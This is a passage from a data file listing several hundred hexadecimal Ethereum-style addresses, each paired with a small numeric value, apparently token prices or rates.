                "0x14409b0fc5c7f87b5dad20754fe22d29a3de8217": 9.12e-8,
                "0xd111bcb8c30a600c12f4af8314235f628ea2cb3c": 4.9e-9,
                "0xe0df31d06d72b2f5231489af0edc422b372f49f1": 3.089e-7,
                "0x07e3c70653548b04f0a75970c1f81b4cbbfb606f": 5.434e-7,
                "0x80c8c3dcfb854f9542567c8dac3f44d709ebc1de": 92936e-10,
                "0x4bb3205bf648b7f59ef90dee0f1b62f6116bc7ca": 77126e-10,
                "0xc12d099be31567add4e4e4d0d45691c3f58f5663": 11768e-10,
                "0xee1cea7665ba7aa97e982edeaecb26b59a04d035": 169e-8,
                "0x15bda08c3afbf5955d6e9b235fd55a1fd0dbc829": 19019e-10,
                "0x737f98ac8ca59f2c68ad658e3c3d8c8963e40a4c": 9.32e-8,
                "0xb78b3320493a4efaa1028130c5ba26f0b6085ef8": 45636e-10,
                "0x2509ee05b8df07ec75046e24bbf1cfcdb8b2a183": 86741e-10,
                "0xbd1848e1491d4308ad18287a745dd4db2a4bd55b": 17882e-10,
                "0x1e18821e69b9faa8e6e75dffe54e7e25754beda0": 2.15e-8,
                "0xa13f0743951b4f6e3e3aa039f682e17279f52bc3": 3.262e-7,
                "0xbbe761ea1447a20b75aa485b7bcad4837415d7d7": 8.151e-7,
                "0xbbff34e47e559ef680067a6b1c980639eeb64d24": 2.027e-7,
                "0xd6a55c63865affd67e2fb9f284f87b7a9e5ff3bd": 51622e-10,
                "0xf70d160102cf7a22c1e432d6928a9d625db91170": 2.33e-8,
                "0x1cbb83ebcd552d5ebf8131ef8c9cd9d9bab342bc": .0006325696,
                "0x2e1e15c44ffe4df6a0cb7371cd00d5028e571d14": 520969e-10,
                "0x7a5ce6abd131ea6b148a022cb76fc180ae3315a6": .0032326562,
                "0xed3d4e446a96dc3b181b64b75c3c70da41dc3cbe": 4.048e-7,
                "0x910524678c0b1b23ffb9285a81f99c29c11cbaed": 50431e-10,
                "0x28dee01d53fed0edf5f6e310bf8ef9311513ae40": 1.462e-7,
                "0xb2f7eb1f2c37645be61d73953035360e768d81e6": 1.358e-7,
                "0x13339fd07934cd674269726edf3b5ccee9dd93de": 283499e-10,
                "0x0e0989b1f9b8a38983c2ba8053269ca62ec9b195": 1.77e-8,
                "0x8e5610ab5e39d26828167640ea29823fe1dd5843": 1.01e-8,
                "0xe3278df3eb2085ba9b6899812a99a10f9ca5e0df": 1.01e-8,
                "0x12d102f06da35cc0111eb58017fd2cd28537d0e1": .0005697239,
                "0x7f1f2d3dfa99678675ece1c243d3f7bc3746db5d": 2083e-9,
                "0x6aeb95f06cda84ca345c2de0f3b7f96923a44f4c": 1.776e-7,
                "0xeed3ae7b0f8b5b9bb8c035a9941382b1822671cd": 5.7e-9,
                "0x23ccc43365d9dd3882eab88f43d515208f832430": 2.706e-7,
                "0x2610f0bfc21ef389fe4d03cfb7de9ac1e6c99d6e": 26045e-10,
                "0x4c25bdf026ea05f32713f00f73ca55857fbf6342": .0001051337,
                "0x2d39ec4da54329d28d230b4973f5aa27886c3aee": 5.434e-7,
                "0xecc0f1f860a82ab3b442382d93853c02d6384389": 239657e-10,
                "0x7777777777697cfeecf846a76326da79cc606517": 47174e-10,
                "0xe48972fcd82a274411c01834e2f031d4377fa2c0": 6.334e-7,
                "0x02f2d4a04e6e01ace88bd2cd632875543b2ef577": 5.5e-9,
                "0x4eeea7b48b9c3ac8f70a9c932a8b1e8a5cb624c7": 1.278e-7,
                "0x4f5fa8f2d12e5eb780f6082dd656c565c48e0f24": 144449e-10,
                "0x2604fa406be957e542beb89e6754fcde6815e83f": 273e-8,
                "0xe64509f0bf07ce2d29a7ef19a8a9bc065477c1b4": 2.717e-7,
                "0x8f1135ea4f8946949441716d66e5390c5a990df0": 5.35e-8,
                "0x624d520bab2e4ad83935fa503fb130614374e850": 1e-8,
                "0xec681f28f4561c2a9534799aa38e0d36a83cf478": 346564e-10,
                "0x8a88f04e0c905054d2f33b26bb3a46d7091a039a": 1.01e-8,
                "0x6e605c269e0c92e70beeb85486f1fc550f9380bd": 5.67e-8,
                "0xc96df921009b790dffca412375251ed1a2b75c60": 11936e-10,
                "0x2c2f7e7c5604d162d75641256b80f1bf6f4dc796": 37448e-10,
                "0x8727c112c712c4a03371ac87a74dd6ab104af768": 33052e-10,
                "0x4ecdb6385f3db3847f9c4a9bf3f9917bb27a5452": 5.78e-8,
                "0xed0889f7e1c7c7267407222be277e1f1ef4d4892": 20428e-10,
                "0xfec0cf7fe078a500abf15f1284958f22049c2c7e": 5.942e-7,
                "0x813b428af3920226e059b68a62e4c04933d4ea7a": 3.5e-9,
                "0x9f8f7ea504588a58b8b24b832b5d25a4aeb4706f": 79071e-10,
                "0x28cca76f6e8ec81e4550ecd761f899110b060e97": 4536e-9,
                "0x593114f03a0a575aece9ed675e52ed68d2172b8c": 1.013e-7,
                "0xc133529e57681b2999708f9458be5634e293995e": 426183e-10,
                "0x0fd67b4ceb9b607ef206904ec73459c4880132c9": 30044e-10,
                "0x4a1d542b52a95ad01ddc70c2e7df0c7bbaadc56f": 33751e-10,
                "0x182f4c4c97cd1c24e1df8fc4c053e5c47bf53bef": 38922e-10,
                "0x84fe25f3921f3426395c883707950d0c00367576": 208e-9,
                "0xd2946be786f35c3cc402c29b323647abda799071": 1.01e-8,
                "0x8b1f49491477e0fb46a29fef53f1ea320d13c349": 23783e-10,
                "0x740623d2c797b7d8d1ecb98e9b4afcf99ec31e14": 253432e-10,
                "0x41875c2332b0877cdfaa699b641402b7d4642c32": 1.01e-8,
                "0x122a86b5dff2d085afb49600b4cd7375d0d94a5f": 1.4e-9,
                "0x40d1f63b5d2048e67e9bedb1b4c2f1a9fb4b6817": 2e-7,
                "0xdb13025b219db5e4529f48b65ff009a26b6ae733": 1.42e-8,
                "0x1e4e46b7bf03ece908c88ff7cc4975560010893a": 16578e-10,
                "0xfa05a73ffe78ef8f1a739473e462c54bae6567d9": 143997e-10,
                "0xed40834a13129509a89be39a9be9c0e96a0ddd71": .0070256465,
                "0xc434b27736a6882d33094d34792999702860a13c": .0004556651,
                "0x305de070488c8469dfac957226c9c900c4bfba22": 159215e-10,
                "0xf5717f5df41ea67ef67dfd3c1d02f9940bcf5d08": 1.8e-9,
                "0x0000000000004946c0e9f43f4dee607b0ef1fa1c": 359683e-10,
                "0xef9cd7882c067686691b6ff49e650b43afbbcc6b": 8.894e-7,
                "0x65ad6a2288b2dd23e466226397c8f5d1794e58fc": 361411e-10,
                "0xaec65404ddc3af3c897ad89571d5772c1a695f22": 8.967e-7,
                "0x2bdc0d42996017fce214b21607a515da41a9e0c5": 3.345e-7,
                "0xf29992d7b589a0a6bd2de7be29a97a6eb73eaf85": 2.764e-7,
                "0xd7631787b4dcc87b1254cfd1e5ce48e96823dee8": 16302e-10,
                "0x4b94c8567763654101f690cf4d54957206383b75": 1.1e-9,
                "0xc20464e0c373486d2b3335576e83a218b1618a5e": 1.336e-7,
                "0x1829aa045e21e0d59580024a951db48096e01782": 2.92e-8,
                "0x6ba460ab75cd2c56343b3517ffeba60748654d26": 1.769e-7,
                "0x9b68bfae21df5a510931a262cecf63f41338f264": 1.358e-7,
                "0x07597255910a51509ca469568b048f2597e72504": 6.37e-8,
                "0x74ceda77281b339142a36817fa5f9e29412bab85": 1.358e-7,
                "0x00d46727c2e4a6e358a8c0d638137a3d91b19be6": 4.14e-8,
                "0x3adfc4999f77d04c8341bac5f3a76f58dff5b37a": 218713e-10,
                "0xa95592dcffa3c080b4b40e459c5f5692f67db7f8": 2.433e-7,
                "0x2c82c73d5b34aa015989462b2948cd616a37641f": 9.509e-7,
                "0xa6a840e50bcaa50da017b91a0d86b8b2d41156ee": 4.47e-8,
                "0xe84d9e32dc8ce819b8d6c83e50edafd46c6354db": 12394e-10,
                "0x0f612a09ead55bb81b6534e80ed5a21bf0a27b16": 1.4e-9,
                "0x26a604dffe3ddab3bee816097f81d3c4a2a4cf97": 1.677e-7,
                "0x878cf148ccbb50426043a9affe54ba408221c7fa": .0021381769,
                "0x5b11aacb6bddb9ffab908fdce739bf4aed554327": 6.995e-7,
                "0x1a4743cf1af4c289351390a2b3fe7c13d2f7c235": 115594e-10,
                "0xb0280743b44bf7db4b6be482b2ba7b75e5da096c": 2.385e-7,
                "0x0e2ef8aecb3c01ad5d596f1b67134e178199984d": 2.667e-7,
                "0x90528aeb3a2b736b780fd1b6c478bb7e1d643170": 3.548e-7,
                "0x04a020325024f130988782bd5276e53595e8d16e": 2.1e-9,
                "0x30680ac0a8a993088223925265fd7a76beb87e7f": 1.01e-8,
                "0x8515cd0f00ad81996d24b9a9c35121a3b759d6cd": 1.01e-8,
                "0xe88f8313e61a97cec1871ee37fbbe2a8bf3ed1e4": 474252e-10,
                "0x72adadb447784dd7ab1f472467750fc485e4cb2d": 1.034e-7,
                "0xe814aee960a85208c3db542c53e7d4a6c8d5f60f": 146281e-10,
                "0xd1e10c37a27d95d95720291b1dc6f12f74c71443": 2.73e-8,
                "0x44197a4c44d6a059297caf6be4f7e172bd56caaf": 2.027e-7,
                "0xb62d18dea74045e822352ce4b3ee77319dc5ff2f": 5.657e-7,
                "0x1de5e000c41c8d35b9f1f4985c23988f05831057": 5.93e-8,
                "0x8e57c27761ebbd381b0f9d09bb92ceb51a358abb": 14e-9,
                "0x5d60d8d7ef6d37e16ebabc324de3be57f135e0bc": 106e-9,
                "0x64cdf819d3e75ac8ec217b3496d7ce167be42e80": 6.74e-8,
                "0x17b26400621695c2d8c2d8869f6259e82d7544c4": 1.01e-8,
                "0xef53462838000184f35f7d991452e5f25110b207": 33505e-10,
                "0x1681bcb589b3cfcf0c0616b0ce9b19b240643dc1": 0,
                "0x1d37986f252d0e349522ea6c3b98cb935495e63e": 7.862e-7,
                "0xe0c6ce3e73029f201e5c0bedb97f67572a93711c": 3.508e-7,
                "0xa4ef4b0b23c1fc81d3f9ecf93510e64f58a4a016": .0001271445,
                "0xaa99199d1e9644b588796f3215089878440d58e0": 88011e-10,
                "0x68350d30d9f58c81aaaa41929f1bfc52fff4ea49": 7.7e-9,
                "0x1245ef80f4d9e02ed9425375e8f649b9221b31d8": 1.358e-7,
                "0xb5b8f5616fe42d5ceca3e87f3fddbdd8f496d760": 1.13e-8,
                "0x47da42696a866cdc61a4c809a515500a242909c1": 4.04e-8,
                "0x2c36204a0712a2a50e54a62f7c4f01867e78cb53": 2.891e-7,
                "0x3a92bd396aef82af98ebc0aa9030d25a23b11c6b": 11678e-10,
                "0xc666081073e8dff8d3d1c2292a29ae1a2153ec09": 1.26e-8,
                "0x8a6f3bf52a26a21531514e23016eeae8ba7e7018": 6.15e-8,
                "0xaff84e86d72edb971341a6a66eb2da209446fa14": 71e-9,
                "0x3f09400313e83d53366147e3ea0e4e2279d80850": 420037e-10,
                "0x1063ce524265d5a3a624f4914acd573dd89ce988": 3.697e-7,
                "0x049399a6b048d52971f7d122ae21a1532722285f": 3.862e-7,
                "0x412d397ddca07d753e3e0c61e367fb1b474b3e7d": 3.38e-8,
                "0xd6bd97a26232ba02172ff86b055d5d7be789335b": 5.33e-8,
                "0x49614661737efbfc6a102efaeefdc8e197f7cc0e": 1.01e-8,
                "0x3ffffa8f3cc943e43f9f17a83cbb18f4bbb9f4ac": 10137e-10,
                "0x9ccbd05d4d25c745d49f5e6bf17e09113eb4c769": 1.01e-8,
                "0x139d9397274bb9e2c29a9aa8aa0b5874d30d62e3": 1.311e-7,
                "0x3d1ba9be9f66b8ee101911bc36d3fb562eac2244": 3.792e-7,
                "0xc15a399c4ea7815fe36857c9e290ee452a5d6b21": 1.338e-7,
                "0x40821cd074dfecb1524286923bc69315075b5c89": 2.423e-7,
                "0x7cc62d8e80be9bea3947f3443ad136f50f75b505": 1.73e-8,
                "0xe7e4279b80d319ede2889855135a22021baf0907": 1e-10,
                "0x9a794dc1939f1d78fa48613b89b8f9d0a20da00e": 3.961e-7,
                "0x68909e586eeac8f47315e84b4c9788dd54ef65bb": 294e-9,
                "0x08aa0ed0040736dd28d4c8b16ab453b368248d19": 1.558e-7,
                "0xeea9ae787f3a620072d13b2cdc8cabffb9c0ab96": 88675e-10,
                "0xb67718b98d52318240c52e71a898335da4a28c42": 0,
                "0x286c0936c7eaf6651099ab5dab9ee5a6cb5d229d": 8.075e-7,
                "0xd5f788ca0de8f17cbde1d1e35aa8f005a87fa00b": 1.358e-7,
                "0x21d5678a62dfe63a47062469ebb2fac2817d8832": 2.433e-7,
                "0x187d1018e8ef879be4194d6ed7590987463ead85": .0095700566,
                "0x5e6b6d9abad9093fdc861ea1600eba1b355cd940": 82e-9,
                "0x97fb6fc2ad532033af97043b563131c5204f8a35": 1.52e-8,
                "0x4618519de4c304f3444ffa7f812dddc2971cc688": 1.663e-7,
                "0x2e98a6804e4b6c832ed0ca876a943abd3400b224": 1.358e-7,
                "0x368c5290b13caa10284db58b4ad4f3e9ee8bf4c9": 7.183e-7,
                "0x9a005c9a89bd72a4bd27721e7a09a3c11d2b03c4": 19e-9,
                "0x679badc551626e01b23ceecefbc9b877ea18fc46": 37711e-10,
                "0xea1f346faf023f974eb5adaf088bbcdf02d761f4": 1.358e-7,
                "0x884181554dfa9e578d36379919c05c25dc4a15bb": 1.36e-8,
                "0x9972a0f24194447e73a7e8b6cd26a52e02ddfad5": 8.82e-8,
                "0xcc34366e3842ca1bd36c1f324d15257960fcc801": 4.075e-7,
                "0xb7c4a82936194fee52a4e3d4cec3415f74507532": 8.31e-8,
                "0x8a6aca71a218301c7081d4e96d64292d3b275ce0": 485239e-10,
                "0xca208bfd69ae6d2667f1fcbe681bae12767c0078": 3532e-9,
                "0x81995ff7aee5c780192b47e0b42a7a86692d1415": 7064e-9,
                "0x86911b82bfa596e9377836838ac1f0d9ad4ecc19": 2.667e-7,
                "0xf80d589b3dbe130c270a69f1a69d050f268786df": 12743e-10,
                "0xe2492f8d2a2618d8709ca99b1d8d75713bd84089": 73e-9,
                "0x5635ddeabf9cdda686995fe90beb5411831563fc": 15723e-10,
                "0x5046e860ff274fb8c66106b0ffb8155849fb0787": 4.075e-7,
                "0x4aac461c86abfa71e9d00d9a2cde8d74e4e1aeea": 5.813e-7,
                "0x4ca0654f4fc1025cf1a17b7459c20ac0479522ad": .0007267308,
                "0xc3e2de0b661cf58f66bde8e896905399ded58af5": 1.358e-7,
                "0x3b7f247f21bf3a07088c2d3423f64233d4b069f7": 75738e-10,
                "0x153ed9cc1b792979d2bde0bbf45cc2a7e436a5f9": 2.03e-8,
                "0x6c37bf4f042712c978a73e3fd56d1f5738dd7c43": 5.437e-7,
                "0x8a732bc91c33c167f868e0af7e6f31e0776d0f71": 0,
                "0xceb286c9604c542d3cc08b41aa6c9675b078a832": 9.897e-7,
                "0x27201232579491ce9b116ac6f37d354cc723a2f3": 53338e-10,
                "0xadf8b8050639b6236915f7516d69de714672f0bf": 2.7e-9,
                "0x193408ca0576b73156ed42a2ea7d6fd3f6507162": 3532e-9,
                "0x874d4c9b980f1a13dd44cbcdb912e24ef0671ed0": 8.3e-9,
                "0xdaab5e695bb0e8ce8384ee56ba38fa8290618e52": 2.332e-7,
                "0x347c099f110ca6761779329d2879957b606b6ace": 8.82e-8,
                "0xd9d01d4cb824219a8f482a0fad479cb971fd0628": 2.717e-7,
                "0x62a56a4a2ef4d355d34d10fbf837e747504d38d4": 1.01e-8,
                "0x8fc9b6354e839ab1c8b31f4afa53607092b8c2e5": 13335e-10,
                "0xd36a0e7b741542208ae0fbb35453c893d0136625": 1.01e-8,
                "0x796e47b85a0d759f300f1de96a3583004235d4d8": 2.168e-7,
                "0x26cb3641aaa43911f1d4cb2ce544eb652aac7c47": 13585e-10,
                "0xc962ad021a69d457564e985738c719ae3f79b707": 1.358e-7,
                "0x9235bda06b8807161b8fbb1e102cb654555b212f": 2.001e-7,
                "0x9e7cb236e43c4bd042fe463df6a175d4479ee186": 1.358e-7,
                "0xade7b5f4a421d81ddad8ce86f77a0efe8921e9cc": 1.36e-8,
                "0x8b6cda5cc518c904e8844f445e1a7c7d2db0ff16": 2.8e-9,
                "0xbae235823d7255d9d48635ced4735227244cd583": 1.358e-7,
                "0xcb39c3502415152b2ec90ff07ee18cc94f681a72": 6e-10,
                "0xd938137e6d96c72e4a6085412ada2dad78ff89c4": 1.01e-8,
                "0x0775c81a273b355e6a5b76e240bf708701f00279": 1.358e-7,
                "0xcb8d1260f9c92a3a545d409466280ffdd7af7042": 4e-10,
                "0x0cc9fccff81252f4bd8c5c6b359b14ae2ed851cf": 0,
                "0xe94b97b6b43639e238c851a7e693f50033efd75c": 0,
                "0xba745513acebcbb977497c569d4f7d340f2a936b": 0,
                "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2": 1.0125967348,
                "0xc12ecee46ed65d970ee5c899fcc7ae133aff9b03": 356427e-10,
                "0x4be10da47a07716af28ad199fbe020501bddd7af": .002103017,
                "0x7b4328c127b85369d9f82ca0503b000d09cf9180": 14275e-10,
                "0x925206b8a707096ed26ae47c84747fe0bb734f59": .009680821,
                "0xfbc4f3f645c4003a2e4f4e9b51077d2daa9a9341": 73379e-9,
                "0x05237e2bd2dfab39a135d254cabae94b183c8bad": 281758e-10,
                "0x71eeba415a523f5c952cc2f06361d5443545ad28": .0004433238,
                "0x3155ba85d5f96b2d030a4966af206230e46849cb": .0010265858,
                "0xd0bd12a8d5ebca1e2fa46da59f1993ec51c3d75c": 880286e-10,
                "0x1456688345527be1f37e9e627da0837d6f08c925": .0006617263,
                "0x19de6b897ed14a376dda0fe53a5420d2ac828a28": .0001299001,
                "0x39aa39c021dfbae8fac545936693ac917d5e7563": 147489e-10,
                "0x9528cceb678b90daf02ca5ca45622d5cbaf58a30": 31713e-10,
                "0x3d382228c54736d831fac2748f4734d9177c7332": 828475e-10,
                "0xee9e7bb7e55bbc86414047b61d65c9c0d91ffbd0": .0011025639,
                "0xbe9895146f7af43049ca1c1ae358b0541ea49704": .9835045951,
                "0xe22020f47b7378dfedcedd2c81d4137c22fe1152": 11175e-9,
                "0x5d3a536e4d6dbd6114cc1ead35777bab948e3643": 147193e-10,
                "0xa693b19d2931d498c5b318df961919bb4aee87a5": 271983e-10,
                "0x420412e765bfa6d85aaac94b4f7b708c89be2e2b": .0001252098,
                "0xd7e0f80fb28233bdde0006c50568606a8feb964c": .0004300221,
                "0xc5fb36dd2fb59d3b98deff88425a3f425ee469ed": 43441e-9,
                "0xf650c3d88d12db855b8bf7d11be6c55a4e07dcc9": 146868e-10,
                "0xf3b9569f82b18aef890de263b84189bd33ebe452": 0,
                "0x3c4008eca800ec1283e4cf500e68d06bfabc00a8": 71097e-10,
                "0x1a7e4e63778b4f12a199c062f3efdd288afcbce8": .0006633782,
                "0x5e74c9036fb86bd7ecdcb084a0673efc32ea31cb": 1.0196227213,
                "0xb1f136a74e18e4e2921febbf25820d1bb65b5647": 824339e-10,
                "0x9792409ae27726d337af30d701ab525372495607": .0001974088,
                "0x52a8845df664d76c69d2eea607cd793565af42b8": .0003551465,
                "0x79b4d12fa63a8d1202b26c5ba6d62136a4a09dda": 92756e-10,
                "0x06450dee7fd2fb8e39061434babcfc05599a6fb8": 6.8e-9,
                "0x1e6063b7b3a1c1952ed2c4087fd528998db69ec7": .0004768313,
                "0x65ef703f5594d2573eb71aaf55bc0cb548492df4": .0030094278,
                "0x0cba60ca5ef4d42f92a5070a8fedd13be93e2861": 63006e-10,
                "0x525a8f6f3ba4752868cde25164382bfbae3990e1": .0001835897,
                "0x9e24415d1e549ebc626a13a482bb117a2b43e9cf": 1e-10,
                "0xa2085073878152ac3090ea13d1e41bd69e60dc99": .0021187809,
                "0xc52c326331e9ce41f04484d3b5e5648158028804": 799035e-10,
                "0xbd4b2dd8fbcecb2af5904ff5f218037b0f693275": 0,
                "0x84fa8f52e437ac04107ec1768764b2b39287cb3e": 0,
                "0x171d76d931529384639bc9aad5b77b77041ed604": .0004471392,
                "0xd9fcd98c322942075a5c3860693e9f4f03aae07b": .0043870444,
                "0x12b6893ce26ea6341919fe289212ef77e51688c8": 153557e-10,
                "0xcf0c122c6b73ff809c693db761e7baebe62b6a2e": 5.1e-9,
                "0x310c8f00b9de3c31ab95ea68feb6c877538f7947": .0003774364,
                "0xa5e262ec733051b14b38901901a82f2684637e78": 183866e-10,
                "0x7cda79830faf07ed696fe220566116951ced36a7": 354.7235476709,
                "0xda30f261a962d5aae94c9ecd170544600d193766": .0038070544,
                "0x6df241103f89983b1fb86244c8601e44ea55368c": .0001027157,
                "0x3301ee63fb29f863f2333bd4466acb46cd8323e6": 1e-10,
                "0x12aef5c60c2c86c8ecd3079f22f285f326371340": 133212e-10,
                "0xa2b4c0af19cc16a6cfacce81f192b024d625817d": 0,
                "0xf5cfbc74057c610c8ef151a439252680ac68c6dc": .0001951146,
                "0x83031984b45553070a088273f341bff7fb4f2f46": 696227e-10,
                "0x116c4b65e14449947bc6fa1bbe844cb16a162d53": .0002061782,
                "0xc5a9bc46a7dbe1c6de493e84a18f02e70e2c5a32": 104618e-10,
                "0x00a7ec2f2b451cb0233e8adbf4c9a951027c2b02": 18382e-10,
                "0x5d43b66da68706d39f6c97f7f1415615672b446b": .0002165784,
                "0x467719ad09025fcc6cf6f8311755809d45a5e5f3": 554434e-9,
                "0xddf7fd345d54ff4b40079579d4c4670415dbfd0a": 374107e-10,
                "0xa88842ae47dbe87116cf7001dddd1b246fcd8262": 270424e-10,
                "0x992d339532a9c42f1b0e59a57e95f38da38c66f6": .0127409239,
                "0xb53ecf1345cabee6ea1a65100ebb153cebcac40f": 15e-9,
                "0x9d71ce49ab8a0e6d2a1e7bfb89374c9392fd6804": 183963e-10,
                "0xa87135285ae208e22068acdbff64b11ec73eaa5a": .0002220111,
                "0xf460d98a3517b45edd8063dd3847de92a8038aa2": 182561e-10,
                "0x355a824bea1adc22733978a3748271e1bbb34130": .0002078152,
                "0x33bd66c334274989b673a8e8c8d1a3f1b8de5889": 28629e-10,
                "0x179b734d0291fa9e3a4728c7c27866ee25ccc3e0": .0002333606,
                "0x62d3c05b9c3d916fbc111819bbd3cee52906c1ae": 7.99e-8,
                "0x635f15eb7aa2e62d122f6b1f9f519fdccf4abdda": 123478e-10,
                "0x0335a7610d817aeca1bebbefbd392ecc2ed587b8": 171712e-10,
                "0x1e0b2992079b620aa13a7c2e7c88d2e1e18e46e9": 114591e-10,
                "0x3700adfd26d5bc062cb8b8a77e68fbd43f58ecab": 70006e-10,
                "0x389999216860ab8e0175387a0c90e5c52522c945": 0,
                "0xbb126042235e6bd38b17744cb31a8bf4a206c045": .001225444,
                "0xdebe620609674f21b1089042527f420372ea98a5": .0002855652,
                "0xa9598333b99d14d90bc81cad8af82c4c70625e75": 34733e-10,
                "0x1e4ede388cbc9f4b5c79681b7f94d36a11abebc9": 704755e-10,
                "0x1b5036bec1b82d44d52fa953a370b3c6cd9328b5": 859909e-9,
                "0x0ff5a8451a839f5f0bb3562689d9a44089738d11": .0172283934,
                "0xeec2be5c91ae7f8a338e1e5f3b5de49d07afdc81": .1901264194,
                "0x4cd0c43b0d53bc318cc5342b77eb6f124e47f526": 62e-9,
                "0xfa372ff1547fa1a283b5112a4685f1358ce5574d": .0006201046,
                "0xd71ecff9342a5ced620049e616c5035f1db98620": .0006720476,
                "0x351caa9045d65107b9d311d922d15887cfd634e4": .0001036705,
                "0x317eb4ad9cfac6232f0046831322e895507bcbeb": 683941e-10,
                "0x6ef6610d24593805144d73b13d4405e00a4e4ac7": 2e-10,
                "0x832c8b1bf8c89f1f827c2bdee2a951530a4e712f": .0001235242,
                "0x4527a3b4a8a150403090a99b87effc96f2195047": .0228088701,
                "0xf7970499814654cd13cb7b6e7634a12a7a8a9abc": .0522178784,
                "0xb29663aa4e2e81e425294193616c1b102b70a158": .0001062748,
                "0x89b69f2d1adffa9a253d40840b6baa7fc903d697": 5.119e-7,
                "0x5b685863494c33f344081f75e5430c260c224a32": 13015e-10,
                "0x5833dbb0749887174b254ba4a5df747ff523a905": .0002412476,
                "0x881ba05de1e78f549cc63a8f6cabb1d4ad32250d": .0002736525,
                "0x00166a5b93fd4f87eca1c267d31d82df3f133a7f": 23499e-10,
                "0x3d371413dd5489f3a04c07c0c2ce369c20986ceb": .0003414235,
                "0xc0ae17eb994fa828540ffa53776b3830233a1b02": 221e-8,
                "0xc5e86e01f8b63178ee2039bfe51a4f73dd10d402": .0046170073,
                "0x9cb1aeafcc8a9406632c5b084246ea72f62d37b6": 11232e-9,
                "0x397deb686c72384fad502a81f4d7fdb89e1f1280": .0006718263,
                "0x2217e5921b7edfb4bb193a6228459974010d2198": .0003374156,
                "0x5bc25f649fc4e26069ddf4cf4010f9f706c23831": .0006750955,
                "0xf65b5c5104c4fafd4b709d9d60a185eae063276c": 855092e-10,
                "0xc744df3419a8c9bd4d6b9852a503eb1c5308a326": 22383e-10,
                "0x5c6ff62552a25d68d453277dd3693f94c7e8c964": 48911e-9,
                "0x3819f64f282bf135d62168c1e513280daf905e06": 2.5e-9,
                "0x2904b9b16652d7d0408eccfa23a19d4a3358230f": 100627e-10,
                "0x6399c842dd2be3de30bf99bc7d1bbf6fa3650e70": .0006741613,
                "0x505b5eda5e25a67e1c24a2bf1a527ed9eb88bf04": 146304e-10,
                "0x990e081a7b7d3ccba26a2f49746a68cc4ff73280": 34908e-10,
                "0xbe9ab37a414c517b2be2bfa5945665bb07379054": 16612e-10,
                "0xba8a621b4a54e61c442f5ec623687e2a942225ef": .0011734328,
                "0x5afff9876c1f98b7d2b53bcb69eb57e92408319f": 57923e-10,
                "0xbd04ccc050058a6a422851fa6c0f92bb65eb06ca": .002099845,
                "0x85f6eb2bd5a062f5f8560be93fb7147e16c81472": 1928e-9,
                "0x33bfd20660eeaf952e8d5bc3236e1918701f17d0": 12532e-10,
                "0xd13cfd3133239a3c73a9e535a5c4dadee36b395c": 54115e-10,
                "0x07f9702ce093db82dfdc92c2c6e578d6ea8d5e22": 840289e-10,
                "0xc221b7e65ffc80de234bbb6667abdd46593d34f0": .0001513649,
                "0x1bbf25e71ec48b84d773809b4ba55b6f4be946fb": .0006470017,
                "0x1afb69dbc9f54d08dab1bd3436f8da1af819e647": 103991e-10,
                "0xc50ef449171a51fbeafd7c562b064b6471c36caa": 0,
                "0x6251e725cd45fb1af99354035a414a2c0890b929": 9.143e-7,
                "0x294559fa758c88d639fd085751e463fee7806eab": .0001728475,
                "0xd084944d3c05cd115c09d072b9f44ba3e0e45921": .0201808323,
                "0xca5e32d44f1744001b5600dc2f5f5e0bbb6e9d3e": 5.65e-8,
                "0x849a226f327b89e3133d9930d927f9eb9346f8c9": 498722e-10,
                "0x27c70cd1946795b66be9d954418546998b546634": .2435375989,
                "0x98585dfc8d9e7d48f0b1ae47ce33332cf4237d96": 219481e-10,
                "0x22987407fd1fc5a971e3fda3b3e74c88666cda91": 2.833e-7,
                "0xba6b0dbb2ba8daa8f5d6817946393aef8d3a4487": .0004810931,
                "0x30dcba0405004cf124045793e1933c798af9e66a": 270717e-10,
                "0xd7f5cabdf696d7d1bf384d7688926a4bdb092c67": 34992e-10,
                "0xf6e06b54855eff198a2d9a8686113665499a6134": 16499e-10,
                "0xb5c578947de0fd71303f71f2c3d41767438bd0de": 106435e-10,
                "0xfc0d6cf33e38bce7ca7d89c0e292274031b7157a": .0001370156,
                "0xb7de92be975ccb27e7352a1d47512acbdb0bac32": 155433e-10,
                "0x4c2e59d098df7b6cbae0848d66de2f8a4889b9c3": 65988e-10,
                "0xc66cdac744916afb6811c71c277d88de90ce8d5b": .0020105107,
                "0x6a8fee0e33cb65a7e8d21badca62e87639ef74b3": .0271557287,
                "0xb009bfaaf85e53f55d8657781eb69feaaed83672": 19668e-10,
                "0x34f0915a5f15a66eba86f6a58be1a471fb7836a7": .0047934252,
                "0x4cff49d0a19ed6ff845a9122fa912abcfb1f68a6": 155951e-10,
                "0xa49d7499271ae71cd8ab9ac515e6694c755d400c": .0003572769,
                "0x1a403e1c96792dfedb8232cf56400eb72ab95acb": .0068406065,
                "0x5cac718a3ae330d361e39244bf9e67ab17514ce8": 378706e-10,
                "0x888888435fde8e7d4c54cab67f206e4199454c60": .0002617564,
                "0x7d8daff6d70cead12c6f077048552cf89130a2b1": 21621e-10,
                "0x00281dfce4cfd72c0b6fda2aaaf077258743f9e8": 103476e-10,
                "0xf1dc500fde233a4055e25e5bbf516372bc4f6871": 106979e-10,
                "0x7121d00b4fa18f13da6c2e30d19c04844e6afdc8": 0,
                "0xed35af169af46a02ee13b9d79eb57d6d68c1749e": 7.897e-7,
                "0x120a3879da835a5af037bb2d1456bebd6b54d4ba": 254351e-10,
                "0xcd17fa52528f37facb3028688e62ec82d9417581": 61592e-9,
                "0x71fc1f555a39e0b698653ab0b475488ec3c34d57": 387825e-10,
                "0x29b3d220f0f1e37b342cf7c48c1164bf5bf79efa": .003633101,
                "0x9ad37205d608b8b219e6a2573f922094cec5c200": 170792e-10,
                "0xe4dae00bc1c46ea2f44ae71b1beb8b171c15d812": 231114e-10,
                "0x2e85ae1c47602f7927bcabc2ff99c40aa222ae15": 1.484e-7,
                "0xc581b735a1688071a1746c968e0798d642ede491": .0006617079,
                "0xf1b99e3e573a1a9c5e6b2ce818b617f0e664e86b": .0671759256,
                "0xedb171c18ce90b633db442f2a6f72874093b49ef": .0029411053,
                "0x2596825a84888e8f24b747df29e11b5dd03c81d7": 99334e-10,
                "0xddd6a0ecc3c6f6c102e5ea3d8af7b801d1a77ac8": 375707e-10,
                "0xa3e53fe692eeda3502cf5ccfd8a535e1f93d23dd": 111418e-10,
                "0x7aa6b33fb7f395ddbca7b7a33264a3c799fa626f": 269152e-10,
                "0xc91a71a1ffa3d8b22ba615ba1b9c01b2bbbf55ad": .0025881708,
